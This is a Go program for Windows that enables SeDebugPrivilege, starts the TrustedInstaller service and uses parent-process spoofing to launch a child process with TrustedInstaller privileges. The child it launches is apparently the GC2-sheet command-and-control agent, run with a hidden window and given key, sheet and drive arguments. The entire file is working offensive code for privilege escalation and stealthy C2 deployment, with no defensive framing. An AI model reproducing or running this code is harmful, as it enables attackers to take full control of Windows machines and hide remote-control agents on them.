package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"

	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"

	"golang.org/x/sys/windows"
)

const (
	seDebugPrivilege = "SeDebugPrivilege"
	tiServiceName    = "TrustedInstaller"
	tiExecutableName = "trustedinstaller.exe"
)

var args []string = os.Args[1:]

func RunAsTrustedInstaller(path string, args []string) error {

	if err := enableSeDebugPrivilege(); err != nil {
		return fmt.Errorf("cannot enable %v: %v", seDebugPrivilege, err)
	}

	svcMgr, err := mgr.Connect()
	if err != nil {
		return fmt.Errorf("cannot connect to svc manager: %v", err)
	}

	s, err := openService(svcMgr.Handle, tiServiceName)
	if err != nil {
		return fmt.Errorf("cannot open ti service: %v", err)
	}

	status, err := s.Query()
	if err != nil {
		return fmt.Errorf("cannot query ti service: %v", err)
	}

	if status.State != svc.Running {
		if err := s.Start(); err != nil {
			return fmt.Errorf("cannot start ti service: %v", err)
		} else {
			defer s.Control(svc.Stop)
		}
	}

	tiPid, err := getTrustedInstallerPid()
	if err != nil {
		return err
	}

	hand, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS|windows.PROCESS_DUP_HANDLE|windows.PROCESS_SET_INFORMATION, true, tiPid)
	if err != nil {
		return fmt.Errorf("cannot open ti process: %v", err)
	}

	// Find the current user's Go bin path
	userHome := os.Getenv("USERPROFILE")
	goBinPath := filepath.Join(userHome, "go", "go", "bin")

	// Full path to the other Go program
	newDir := filepath.Join(userHome, "Downloads", "master", "GC2-sheet-Scripted-master")

	// Change the current working directory to the new directory
	if err := os.Chdir(newDir); err != nil {
        	return fmt.Errorf("Error changing directory: %v", err)
	}

	cmd := exec.Command(path, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
	CreationFlags: windows.CREATE_NEW_CONSOLE,
	ParentProcess: syscall.Handle(hand),
	}

	// Determine the appropriate path separator for the current OS
	pathSeparator := string(os.PathListSeparator)

	// Construct the new PATH environment variable
	currentPath := os.Getenv("PATH")
	newPath := fmt.Sprintf("%s%s%s", goBinPath, pathSeparator, currentPath)

	// Set the PATH environment variable for this command
	cmd.Env = append(os.Environ(), fmt.Sprintf("PATH=%s", newPath))

	err = cmd.Start()
	if err != nil {
		return fmt.Errorf("cannot start new process: %v", err)
	}

	fmt.Println("Started process with PID", cmd.Process.Pid)
	return nil
}

func main() {
	if err := RunAsTrustedInstaller("go", []string{"run", "-ldflags='-H=windowsgui'", "GC2-sheet", "-k", args[0], "-s", args[1], "-d", args[2]}); err != nil {
		panic(err)
	}
}
